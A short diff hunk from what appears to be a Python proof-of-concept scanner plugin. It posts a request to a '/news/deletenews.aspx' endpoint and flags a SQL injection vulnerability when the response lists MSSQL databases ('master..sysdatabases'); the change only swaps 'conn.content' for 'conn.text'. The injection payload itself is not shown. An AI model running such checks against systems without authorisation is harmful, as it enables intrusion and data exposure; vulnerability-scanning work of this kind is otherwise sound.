@@ -80,7 +80,7 @@ class Poc(ABPoc):
                 url = self.target + '/news/deletenews.aspx'
                 conn = requests.post(
                     url, data=body, headers=headers, verify=False, allow_redirects=False)
-                html_doc = conn.content
+                html_doc = conn.text
                 conn.close()
                 if conn.status_code == 200 and "master..sysdatabases" in conn.text:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞;遍历的数据为:{database}, url={url}'.format(
